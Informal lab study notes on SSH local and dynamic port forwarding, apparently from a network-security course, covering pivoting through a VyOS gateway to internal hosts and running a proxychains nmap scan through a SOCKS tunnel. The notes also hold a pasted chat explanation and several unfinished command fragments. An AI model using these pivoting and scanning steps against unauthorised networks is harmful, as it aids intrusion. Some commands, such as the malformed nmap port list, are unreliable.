ssh -p <optional alt port> <user>@<pivot ip> -L <local bind port>:<tgt ip>:<tgt port> -NT
or
ssh -L <local bind port>:<tgt ip>:<tgt port> -p <alt port> <user>@<pivot ip> -NT

ssh vyos@172.16.20.1 -L 127.0.0.1:2223:172.16.1.15:22

Connected to 20.1 but not touched .15.22 yet..this happens when 

GATEWAY FORWARDING...

ssh student@127.0.0.1 -> If I gotta get to 15:22 you gotta go through here.. 


This command initiates an SSH (Secure Shell) connection to the remote host at IP address 172.16.20.1 with the username vyos. However, it also includes a port forwarding option (-L) that sets up a local port forwarding rule.

Here's a breakdown of what each part of the command does:

vyos@172.16.20.1: This specifies the SSH username (vyos) and the IP address of the remote host (172.16.20.1) to connect to.

-L 127.0.0.1:2223:172.16.1.15:22: This is the port forwarding configuration. It consists of two parts separated by a colon:

127.0.0.1:2223: This part specifies the local endpoint of the port forwarding. It means that on your local machine (127.0.0.1), port 2223 is being forwarded.

172.16.1.15:22: This part specifies the remote endpoint of the port forwarding. It means that traffic received on your local machine's port 2223 will be forwarded to the remote machine at IP address 172.16.1.15 on port 22 (the default SSH port).

So, what this command does is establish an SSH connection to 172.16.20.1 and sets up a local port forwarding rule where any traffic sent to your local machine on port 2223 will be forwarded to the remote machine at 172.16.1.15 on port 22. This can be useful for securely accessing services on the remote machine (172.16.1.15) as if they were running locally on your own machine, using port 2223 as the entry point.

For example, after running this command, you can SSH into the remote machine as follows:

bash
Copy code
ssh -p 2223 localhost
This connects to your local port 2223, and the SSH traffic is forwarded to the remote machine, allowing you to log in as if you were directly SSHing into 172.16.1.15.

ss -nltp

ssh 

ss -ant | grep ESTAB -> 






#### BDY ####
ssh -L 127.0.0.1:2222:172.16.1.15:22 vyos@172.16.20.1
ssh vyos@172.16.20.1 -L 127.0.0.1:2223:172.16.1.15:22  ##Same command as above, just using a different port and moving the user/password creds to a more logical place
ss -natp | grep <port #> OR grep ESTAB to see if you are listening
* double-click Terminator window to rename
(From blue-int-dmz-host-1-student-#) 1. ssh student@127.0.0.1 -p 2223 -L 127.0.0.1:4444:172.16.40.10:22
(From blue-internet-host-student-#) 2. ssh student@127.0.0.1 -p 4444

## SSH DYNAMIC PORT FORWARDING ##

ssh -D <port> -p <alt port> <user>@<pivot ip> -NT
Proxychains default port is 9050

Creates a dynamic socks4 proxy that interacts alone, or with a previously established remote or local port forward.

Allows the use of scripts and other userspace programs through the tunnel.


ssh vyos@172.16.20.1 -D 9050 # You can use any port you can but by default proxy chain uses 9050

proxychains nmap -Pn -sT 172.16.1.30/27 -p 21-23 80 # proxychain command that allows encapsulation


ssh vyos@172.16 #Tunnel through a tunnel 

